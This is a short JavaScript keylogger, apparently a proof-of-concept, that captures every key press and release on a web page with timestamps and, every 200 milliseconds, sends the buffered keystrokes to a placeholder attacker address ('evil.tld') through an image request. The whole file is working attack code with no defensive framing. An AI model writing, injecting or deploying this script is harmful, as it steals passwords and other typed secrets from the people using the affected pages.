var buffer = [];
var attacker = 'http://evil.tld/?c='

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp,
        r: 0
    };
    //alert('press'+e.key);
     document.getElementById("demo").innerHTML = 'press '+e.key+timestamp;
    buffer.push(stroke);
}

document.onkeyup = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp,
        r: 1
    };
    //alert('release'+e.key);
    document.getElementById("demo").innerHTML = 'release '+e.key + timestamp;
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
    	//alert(buffer.join());
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);